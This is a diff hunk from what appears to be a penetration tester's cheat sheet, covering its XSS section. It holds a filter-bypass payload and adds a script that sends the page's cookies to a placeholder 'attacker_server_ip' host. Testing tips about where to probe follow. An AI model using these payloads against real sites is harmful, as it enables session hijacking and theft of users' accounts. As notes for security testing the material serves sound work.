@@ -300,6 +300,8 @@ s
 
 #XSS
 [+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload 
+[+] <script>image = new Image();
+image.src='http://attacker_server_ip/?c='+document.cookie;</script>  -- steal cookies
 [+] Test site with html injection tags e.g <b>test<b> beforre inputting XSS
 [+] Scope: test COMMENTS, FEEDBACKS, CHECK STOCK & SEARCH 
 [+] Check the string or parameter you are entrapped by inspecting webpage
